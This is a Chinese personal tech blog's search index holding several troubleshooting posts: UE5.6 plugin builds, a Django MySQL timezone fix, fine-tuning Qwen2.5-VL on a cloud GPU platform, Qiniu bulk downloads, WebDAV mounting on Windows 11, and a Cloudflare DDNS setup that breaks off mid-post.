<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      
        <title>UE5.6使用Unrealcv和MatrixCityPlugin遇到的一些问题：</title>
      
      <link href="/archives/1020f683.html"/>
      <url>/archives/1020f683.html</url>
      
        <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>最近需要用干一些地编的活，需要用虚幻引擎来采集深度数据，遂找了俩可以采集深度图的插件Unrealcv和MatrixCityPlugin，在编译的过程中遇到了些抽象问题。</p><h3 id="报错：ConcurrentLinearAllocator-h-31-error-C4668-‘-has-feature’-is-not-defined-as-a-preprocessor-macro-replacing-with-‘0’-for-‘-if-elif’"><a href="#报错：ConcurrentLinearAllocator-h-31-error-C4668-‘-has-feature’-is-not-defined-as-a-preprocessor-macro-replacing-with-‘0’-for-‘-if-elif’" class="headerlink" title="报错：ConcurrentLinearAllocator.h(31): error C4668: ‘__has_feature’ is not defined as a preprocessor macro, replacing with ‘0’ for ‘#if&#x2F;#elif’"></a>报错：ConcurrentLinearAllocator.h(31): error C4668: ‘__has_feature’ is not defined as a preprocessor macro, replacing with ‘0’ for ‘#if&#x2F;#elif’</h3><p>编译插件建议开一个空项目，丢进去先编译好在放到项目里。编译Unrealcv遇到了：</p><blockquote><p>ConcurrentLinearAllocator.h(31): error C4668: ‘__has_feature’ is not defined as a preprocessor macro, replacing with ‘0’ for ‘#if&#x2F;#elif’</p></blockquote><p>这个问题原因是新版vs使用了新版的msvc, 而它移除了该宏。解决方法很简单，先在vs installer下一个旧版本的msvc，然后在<code>C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC</code>目录下可以找到刚刚安装的旧版本号。</p><p><img src="https://cdn.lmark.cc/img/image-20251011202611581.png" alt="image-20251011202611581"></p><p>然后找到<code>BuildConfiguration.xml</code>，注意是UE5的对应文件，不是项目文件里的，默认路径在：<code>C:\Users\&#123;yourname&#125;&#125;\AppData\Roaming\Unreal Engine\UnrealBuildTool\BuildConfiguration.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">xmlns</span>=<span class="string">&quot;https://www.unrealengine.com/BuildConfiguration&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">WindowsPlatform</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CompilerVersion</span>&gt;</span>14.38.33130<span class="tag">&lt;/<span class="name">CompilerVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ToolchainVersion</span>&gt;</span>14.38.33130<span class="tag">&lt;/<span class="name">ToolchainVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">WindowsPlatform</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将里面的版本号替换成旧版的即可。当然你是从源码编译的UE5话，还可以直接修改这个调用，打开<code>Engine\Source\Runtime\Core\Public\Experimental\ConcurrentLinearAllocator.h</code></p><p>用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(__has_feature)*</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __has_feature(address_sanitizer)*</span></span><br></pre></td></tr></table></figure><p>替换掉</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> __has_feature(address_sanitizer)*</span></span><br></pre></td></tr></table></figure><p>重新编译UE5即可。</p><h3 id="UE5-6-Magick-NET-Q16-HDRI-AnyCPU-高危漏洞"><a href="#UE5-6-Magick-NET-Q16-HDRI-AnyCPU-高危漏洞" class="headerlink" title="UE5.6 Magick.NET-Q16-HDRI-AnyCPU 高危漏洞"></a>UE5.6 Magick.NET-Q16-HDRI-AnyCPU 高危漏洞</h3><p>Unrealcv编译好用了几天后，再编译时，突然发现编译不通过了，报错说项目有高危漏洞。解决方法是打开vs项目，右边解决方案栏里会有提示，根据提示更新就行，参考：<a href="https://zhuanlan.zhihu.com/p/1932541266320664119">UE5.6.0 Magick.NET-Q16-HDRI-AnyCPU 高位漏洞 更新Automation project指南 - 知乎</a></p><h3 id="MSB3073-exited-with-code-8"><a href="#MSB3073-exited-with-code-8" class="headerlink" title="MSB3073 exited with code 8"></a>MSB3073 exited with code 8</h3><p>忘记怎么解决的了，好像是当时用了c4d插件，死活编译不过，报这个错，然后我禁用就好了，参考：<a href="https://forums.unrealengine.com/t/msb3073-exited-with-code-8/1901997">MSB3073 以代码 8 退出 - 开发 &#x2F; 编程与脚本 - 埃及开发者社区论坛 — MSB3073 exited with code 8 - Development &#x2F; Programming &amp; Scripting - Epic Developer Community Forums</a></p><h3 id="MatrixCityPlugin插件在5-6-1编译失败"><a href="#MatrixCityPlugin插件在5-6-1编译失败" class="headerlink" title="MatrixCityPlugin插件在5.6.1编译失败"></a>MatrixCityPlugin插件在5.6.1编译失败</h3><p>UE5.6更新了许多特性，但是MatrixCityPlugin官方只提供了5.0的二进制，当我尝试使用runUAT去移植时，出现了下面的报错：<br><img src="https://cdn.lmark.cc/img/image-20251011213759000.png" alt="image-20251011213759000"></p><p>使用的命令是：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunUAT.bat BuildPlugin -Plugin=&quot;C:\Users\&#123;yourname&#125;\Desktop\MatrixCity\MatrixCityPlugin\MatrixCityPlugin.uplugin&quot; -Package=&quot;C:\sbue5\plgtest&quot;</span><br></pre></td></tr></table></figure><p>发现是找不到一个头文件<code>MoviePipelineMasterConfig.h</code>，查阅资料发现，从UE5.2开始，这个头文件改名为了<code>MovePipelinePrimaryConfig.h</code>，同时里面的<code>UMoviePipelineMasterConfig </code>类也更名为了<code> UMoviePipelineMasterConfig</code>。</p><p>参考<a href="https://github.com/chenyong2github/UnrealEngine/blob/c865e168d0935b8e5f4bd865ddcc1c733c8ce7cf/Engine/Plugins/MovieScene/MovieRenderPipeline/Source/MovieRenderPipelineCore/Public/MoviePipelineMasterConfig.h#L6">UnrealEngine&#x2F;Engine&#x2F;Plugins&#x2F;MovieScene&#x2F;MovieRenderPipeline&#x2F;Source&#x2F;MovieRenderPipelineCore&#x2F;Public&#x2F;MoviePipelineMasterConfig.h </a></p><p>把头文件一改，相关函数一改，重新编译，又报错了：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unable to instantiate module <span class="string">&#x27;UnrealEd&#x27;</span>: Unable to instantiate UnrealEd module <span class="keyword">for</span> non<span class="literal">-editor</span> targets.</span><br><span class="line">(referenced via Target -&gt; MatrixCityPlugin.Build.cs -&gt; MovieRenderPipelineEditor.Build.cs -&gt; MovieSceneTools.Build.cs)</span><br></pre></td></tr></table></figure><p>这个错误是由于插件里引用了仅限编辑器使用的模块，这些模块无法在非编辑器目标（如游戏发布版本）中使用。遂放弃用runUAT，老老实实丢到一个项目里去编译了。最后用起来是没有啥问题的，这里贴一个适配UE5.6的MatrixCity项目链接：[ladeng07&#x2F;MatrixCity: <a href="https://github.com/ladeng07/MatrixCity">ICCV 2023] MatrixCity: A Large-scale City Dataset for City-scale Neural Rendering and Beyond.</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Unreal </tag>
            
            <tag> 虚幻5 </tag>
            
            <tag> 地编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>解决django报错&quot;Database returned an invalid datetime value. Are time zone definitions for your database installed?&quot;</title>
      
      <link href="/archives/13f312f.html"/>
      <url>/archives/13f312f.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天写Django项目，创建订单时遇到个bug <code>MySQL backend does notsupport timezone-aware datetimes when USE TZ is False</code><br><img src="https://cdn.lmark.cc/img/image-20250714003023910.png" alt="image-20250714003023910"></p><p>我把Django的USE_TZ关掉时，他说我mysql不支持，我去打开之后，能创建订单了，但是admin里商品显示有问题了，报错<code>&quot;Database returned an invalid datetime value. Are time zone definitions for your database installed?&quot;</code><br>然后网上查教程让我把这个选项USE_TZ时区支持打开(Django5.0默认打开)。一根筋变成两头堵了。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>研究了好久，比如给我mysql加上 <code>SET time_zone = &#39;+08:00&#39;</code>再重启，没用。还是一样报错。后面查了好久才发现，原来是我的mysql数据库里没时区信息，虽然不知道为什么都2025年了，默认不自带时区信息。</p><p>Linux下使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_tzinfo_to_sql /usr/share/zoneinfo | mysql -u root mysql</span><br></pre></td></tr></table></figure><p>即可写入时区信息，Windows比较麻烦，得去官网下一个时区的sql文件<a href="https://dev.mysql.com/downloads/timezones.html">MySQL :: Time zone description tables</a>，</p><p><img src="https://cdn.lmark.cc/img/image-20250714003954553.png" alt="image-20250714003954553"></p><p>选<code>timezone_2025b_posix_sql.zip</code>下载，然后解压出sql文件在数据库里执行一下就行了，大概看了一下，里面都是些时区名字和时间偏移的对应关系。如下图所示：</p><p><img src="https://cdn.lmark.cc/img/image-20250714003912815.png" alt="image-20250714003912815"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>曙光平台安装llama-factory以及微调qwen2.5-VL-3B模型</title>
      
      <link href="/archives/d8057fb8.html"/>
      <url>/archives/d8057fb8.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>毕设做完了，毕业典礼结束了，进组老师安排了一个复现大模型微调的任务，遂开始装环境，记录一下装环境遇到的各种坑。</p><h2 id="SCNet曙光平台conda环境"><a href="#SCNet曙光平台conda环境" class="headerlink" title="SCNet曙光平台conda环境"></a>SCNet曙光平台conda环境</h2><p>老师给我分了张A800，在云平台上。A800是A100的残血版，貌似砍了CUDA核心数，但是对于微调来说，倒也够用了。曙光平台进来之后直接开ssh，把连接信息和密钥填到配置文件里就能直接连了。</p><p><img src="https://cdn.lmark.cc/img/image-20250708011324224.png" alt="image-20250708011324224"></p><p>连上之后首先要做的是配环境，默认环境中各种软体，应用程式都是缺失的，如conda，这就需要我们从module里load进来，然后创建环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module ava  <span class="comment">#查看可用软体</span></span><br><span class="line"></span><br><span class="line">module  load  anaconda3/2023.09 <span class="comment">#conda</span></span><br><span class="line"></span><br><span class="line">module load  compiler/gcc/12.2.0 <span class="comment">#gcc12,可以先加载进来，待会编译库需要用到</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20250708153027703.png" alt="image-20250708153027703"></p><p>然后开始经典conda装环境部分，这次实验环境需要的库如下：<br><img src="https://cdn.lmark.cc/img/image-20250708153306571.png" alt="image-20250708153306571"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">conda  <span class="comment"># 创建并激活虚拟环境（以 conda 为例）</span></span><br><span class="line">conda create -n llm_finetune python=3.10</span><br><span class="line">conda activate llm_finetune</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span><span class="string">&quot;datasets==3.4.1</span></span><br><span class="line"><span class="string">llamafactory==0.9.3</span></span><br><span class="line"><span class="string">multiprocess==0.70.16</span></span><br><span class="line"><span class="string">numpy==1.26.3</span></span><br><span class="line"><span class="string">openai==1.70.0</span></span><br><span class="line"><span class="string">pandas==2.2.3</span></span><br><span class="line"><span class="string">tokenizers==0.21.0</span></span><br><span class="line"><span class="string">torch==2.6.0</span></span><br><span class="line"><span class="string">torchvision==0.21.0</span></span><br><span class="line"><span class="string">transformers==4.50.0</span></span><br><span class="line"><span class="string">vllm==0.8.2&quot;</span><span class="string">&quot;&quot;</span> &gt; requirements.txt</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>此时在安装llamafactory的av依赖时，会报一个匪夷所思的错误：<strong>ValueError: You are not using a virtual environment</strong></p><p>明明已经在conda虚拟环境里了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">error: subprocess-exited-with-error</span><br><span class="line"></span><br><span class="line">× Getting requirements to build wheel did not run successfully.</span><br><span class="line">│ exit code: 1</span><br><span class="line">╰─&gt; [17 lines of output]</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">      File &quot;/work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;, line 389, in &lt;module&gt;</span><br><span class="line">        main()</span><br><span class="line">      File &quot;/work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;, line 373, in main</span><br><span class="line">        json_out[&quot;return_val&quot;] = hook(**hook_input[&quot;kwargs&quot;])</span><br><span class="line">      File &quot;/work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;, line 143, in get_requires_for_build_wheel</span><br><span class="line">        return hook(config_settings)</span><br><span class="line">      File &quot;/tmp/pip-build-env-86tzotxm/overlay/lib/python3.10/site-packages/setuptools/build_meta.py&quot;, line 331, in get_requires_for_build_wheel</span><br><span class="line">        return self._get_build_requires(config_settings, requirements=[])</span><br><span class="line">      File &quot;/tmp/pip-build-env-86tzotxm/overlay/lib/python3.10/site-packages/setuptools/build_meta.py&quot;, line 301, in _get_build_requires</span><br><span class="line">        self.run_setup()</span><br><span class="line">      File &quot;/tmp/pip-build-env-86tzotxm/overlay/lib/python3.10/site-packages/setuptools/build_meta.py&quot;, line 512, in run_setup</span><br><span class="line">        super().run_setup(setup_script=setup_script)</span><br><span class="line">      File &quot;/tmp/pip-build-env-86tzotxm/overlay/lib/python3.10/site-packages/setuptools/build_meta.py&quot;, line 317, in run_setup</span><br><span class="line">        exec(code, locals())</span><br><span class="line">      File &quot;&lt;string&gt;&quot;, line 21, in &lt;module&gt;</span><br><span class="line">    ValueError: You are not using a virtual environment</span><br><span class="line">    [end of output]</span><br></pre></td></tr></table></figure><p>官方仓库里的解决方法<a href="https://github.com/PyAV-Org/PyAV/issues/1946">Problem when installing av 15.0.0 · Issue #1946 · PyAV-Org&#x2F;PyAV</a>，添加变量 <strong>GITHUB_ACTIONS&#x3D;true</strong>：试了一下，并不能解决：<br><img src="https://cdn.lmark.cc/img/image-20250709005916232.png" alt="image-20250709005916232"></p><p>去pr里找了找，还真找到了这个bug…..</p><p><img src="https://cdn.lmark.cc/img/image-20250709010258890.png" alt="image-20250709010258890"></p><p>世界果然是个巨大的草台班子。最后还是老老实实安装了av&#x3D;&#x3D;14.4.0。anyway，能跑就行。</p><h2 id="下载qwen2-5VL-3B-Instruct"><a href="#下载qwen2-5VL-3B-Instruct" class="headerlink" title="下载qwen2.5VL-3B-Instruct"></a>下载qwen2.5VL-3B-Instruct</h2><p>国内的话，裸连抱抱脸大概率是连不上的，所以我选择用魔塔下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install modelscope</span><br><span class="line">modelscope download --model Qwen/Qwen2.5-VL-3B-Instruct</span><br></pre></td></tr></table></figure><h2 id="分配GPU并启动webui界面"><a href="#分配GPU并启动webui界面" class="headerlink" title="分配GPU并启动webui界面"></a>分配GPU并启动webui界面</h2><p>平台的GPU有两种使用方式，主动抢占和任务提交。前者和本地运行类似，但是不手动释放GPU别人无法使用，适合调试；而任务提交可以离线处理任务，系统自动分配GPU，并且在计算资源不足时会自动排队等候，适合重复多次的调参任务。两种方法各有利弊吧，有些平台不支持长时间抢占GPU，所以有人开发出抢占脚本，提交任务后让GPU空转，需要时再连上去用（扯远了。<br>我们想用webui的话，得抢占GPU再启动界面，使用如下命令申请GPU：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salloc -p 节点名  -N 节点数 -n 核心数 --gres=gpu:GPU数量</span><br><span class="line"><span class="comment"># salloc 申请成功后会返回申请到的节点和作业ID等信息，假设申请到的是a4u03n07节点，作业ID为1078858</span></span><br><span class="line">ssh a4u03n07      <span class="comment"># 直接登录到刚刚申请到的节点a4u03n07调式作业</span></span><br><span class="line">scancel 1078858   <span class="comment"># 计算资源使用完后取消作业</span></span><br><span class="line">squeue -j 1078858 <span class="comment"># 查看作业是否还在运行，确保作业已经退出，避免产生不必要的费用</span></span><br></pre></td></tr></table></figure><p>GPU数量为0也能申请，实测曙光平台申请GPU数量为0也能随便使用某节点所有卡。</p><p>这是切换虚拟环境再启动webui，出现一个问题：明明vscode的ssh自带了端口转发，但是我们还是访问不到webui。这是为什么呢？仔细观察会发现，连接了分配的节点后，pip软件包是安装不了的，说明了节点所在的网络和我们登录进来的网络是隔离的，也就是说我们最开始连接的是一个跳板机。知道了这个，问题就好解决了，只需要在连接节点是，配置一个端口转发到跳板机即可。</p><p>即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh a4u03n07  -L 7860:127.0.0.1:7860       <span class="comment">#7860为llama-factory默认端口</span></span><br><span class="line">llamafactory-cli webui                     <span class="comment">#启动ui界面</span></span><br></pre></td></tr></table></figure><p>经过了漫长的等待，不出所料，报错了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ...... </span><br><span class="line">File <span class="string">&quot;/work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/importlib/__init__.py&quot;</span>, line 126, <span class="keyword">in</span> import_module</span><br><span class="line">    <span class="built_in">return</span> _bootstrap._gcd_import(name[level:], package, level)</span><br><span class="line">  File <span class="string">&quot;/work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/site-packages/zmq/backend/cython/__init__.py&quot;</span>, line 6, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from . import _zmq</span><br><span class="line">ImportError: /work/home/huangnaixuan/.conda/envs/llm_finetune/bin/../lib/libstdc++.so.6: version `GLIBCXX_3.4.30<span class="string">&#x27; not found (required by /work/home/huangnaixuan/.conda/envs/llm_finetune/lib/python3.10/site-packages/zmq/backend/cython/_zmq.cpython-310-x86_64-linux-gnu.so)</span></span><br></pre></td></tr></table></figure><p>预编译vllm包的GCC版本比较高，conda默认的gcc是4.8.5，所有需要更新一下gcc版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install -c conda-forge gcc=12</span><br></pre></td></tr></table></figure><p>不过不知道为什么我这里更新不了，只能把系统自带的gcc12的libstdc++链接过去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /public/software/compiler/gcc-12.2.0/lib64/libstdc++.so.6.0.30 ~/.conda/envs/&#123;环境名&#125;/lib/libstdc++.so.6</span><br></pre></td></tr></table></figure><p>终于跑起来了</p><p><img src="https://cdn.lmark.cc/img/image-20250806021452585.png" alt="image-20250806021452585"></p><h2 id="安装Flash-Attention-2"><a href="#安装Flash-Attention-2" class="headerlink" title="安装Flash-Attention-2"></a>安装Flash-Attention-2</h2><p>Flash-Attention-2能显著提升推理速度和减小显存占用，装一个是挺好的，先查看python，pytorch和cuda版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python --version &amp;&amp; python -c <span class="string">&quot;import torch; print(torch.__version__); print(torch.cuda.is_available())&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20250806025843287.png" alt="image-20250806025843287"></p><p>在<a href="https://github.com/Dao-AILab/flash-attention/releases">Releases · Dao-AILab&#x2F;flash-attention</a>中，下载对应的版本，值得注意的是，从v2.8.0.post1开始，官方提供的预编译包是在ubuntu-22.04编译的，在我的服务器上跑不起来，所以我选择用v2.7.4.post1的二进制包：<br><img src="https://cdn.lmark.cc/img/image-20250806030216536.png" alt="image-20250806030216536"></p><p>还有一个点是cxx11abi选项，它指的是 C++ ABI（应用二进制接口），<code>cxx11abiTRUE</code> 表示使用 C++11 ABI 编译，<code>cxx11abiFALSE</code> 则表示不使用 C++11 ABI 编译。不同的编译器和系统可能对 C++ ABI 有不同的支持，因此需要根据自己的环境选择合适的版本。这里我用FALSE的版本，</p><h2 id="安装deepspeed"><a href="#安装deepspeed" class="headerlink" title="安装deepspeed"></a>安装deepspeed</h2><p>直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install deepspeed</span><br></pre></td></tr></table></figure><p>即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
            <tag> 微调 </tag>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>七牛云批量下载图床图片</title>
      
      <link href="/archives/8f8ea55e.html"/>
      <url>/archives/8f8ea55e.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>大一搭博客的时候，需要用到图床，当时用了免费的SM.MS速度差点意思，正好看到七牛云有免费的10G空间，用来搭图床足够了。正好typora也支持接入七牛云，就这样写了几年博客，上传了两千多张照片，一直用的好好的。</p><p>直到去年，腾讯云的免费https证书从时间从1年变成了三个月，博客的图床经常因为没更新证书直接挂掉。此时开始萌生想把七牛云上的图片迁移走的想法。然后找了一圈发现，七牛云网站本身不支持批量下载，但是官方提供了一个命令行工具可以批量下载：<a href="https://github.com/qiniu/qshell">qiniu&#x2F;qshell: Shell Tools for Qiniu Cloud</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>参考官方教程<a href="https://developer.qiniu.com/kodo/kb/12955/kodo-batch-download?category=kb">批量下载 - 七牛开发者中心</a></p><p>下载了qshell.exe（以windows为例）之后，使用如下两个命令可以进行下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qshell account 您的ak 您的sk 空间名称</span><br><span class="line">qshell qdownload2 --dest-dir=本地文件夹相对路径或者绝对路径 --bucket=空间名称</span><br></pre></td></tr></table></figure><p>这里的ak和sk都是密钥，之前使用七牛云作图床时，已经保存过一份，空间名称就是空间管理中的名字，如下：</p><p><img src="http://192.168.8.229:40027/img/img/image-20250822004037308.png" alt="image-20250822004037308"></p><p>然后就能下载了，在这里我推荐另外一个方法，把以上信息写入conf文件里，之后可以直接调用，格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKey&quot;</span><span class="punctuation">:</span> 您的ak<span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;secretKey&quot;</span><span class="punctuation">:</span> 您的sk<span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> 空间名称<span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;cdn_domain、&quot;</span><span class="punctuation">:</span> cdn使用的域名<span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;dest_dir&quot;</span><span class="punctuation">:</span> 保存路径</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>批量下载是支持增量下载的，也就说之后可以写定时任务，自动备份图床图片。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 七牛云 </tag>
            
            <tag> 备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Windows11挂载群晖webdav到本地</title>
      
      <link href="/archives/ea042a0d.html"/>
      <url>/archives/ea042a0d.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在群晖里启动了webdav server之后，windows11上添加会出现<code>0x80070043 找不到网络名</code></p><p><img src="https://cdn.lmark.cc/img/image-20241016160808887.png"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul><li>确认webdav服务正确打开，端口无冲突。</li><li>windows11注册表的<code>BasicAuthLevel</code>设置为2</li></ul><p>具体操作</p><ol><li>使用<code>win+R</code>，输入<code>regedit</code>打开注册表</li><li>找到<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient\Parameters</code>键</li><li>找到<code>BasicAuthLevel</code>的项</li><li>修改其值为2</li></ol><p><img src="https://cdn.lmark.cc/img/image-20241016161746210.png"></p><ol start="5"><li>如果不存在这个键，新建一个名为<code>BasicAuthLevel</code>，类型为<code>DWORD</code>的值，设置为2</li><li>重启</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>使用脚本自动更新实验室电脑IP到cloudflare域名</title>
      
      <link href="/archives/efb03d74.html"/>
      <url>/archives/efb03d74.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>之前实验室路由器用的老师的账号，有段时间网络不好，校园网老掉，师兄他们得经常重新登录，每次重新登陆容易造成实验室路由器IP改变，因为我的loongson电脑放在实验室，打洞在校园网。每次换IP我还得跑到实验室去重新看，累死我。然后想到可以像DDNS一样，请求一下API来定时更新IP。因为我的域名是停靠在CF的，所以得用CF的API。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>理论上只要一条请求就可以更新了，但是在这之前，得先获取别的信息，所以整个过程要分三步。</p><ul><li>先获取zone的id</li><li>在获取对应子域名的id</li><li>最后组装成更新请求</li></ul><p>在开始之前，我们需要先去CF申请一个API的令牌：<a href="https://dash.cloudflare.com/profile/api-tokens">User API Tokens | Cloudflare</a></p><p><img src="https://cdn.lmark.cc/img/image-20240312211343051.png"></p><p>选择你的域名，然后点击进入，滑倒下面，找到<code>Get your API token</code>，进去后点击右上角的create，选择下图的<code>Edit zone DNS</code></p><p><img src="https://cdn.lmark.cc/img/image-20240312211626694.png"></p><p>然后配置大概如下，然后再continue就可以了，最后保存好你的密钥。</p><p><img src="https://cdn.lmark.cc/img/image-20240312211706353.png"></p><h3 id="获取zone的id"><a href="#获取zone的id" class="headerlink" title="获取zone的id"></a>获取zone的id</h3><p>命令如下，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;https://api.cloudflare.com/client/v4/zones&quot;</span> -H <span class="string">&quot;Authorization: Bearer TOKEN&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br></pre></td></tr></table></figure><p>返回格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span 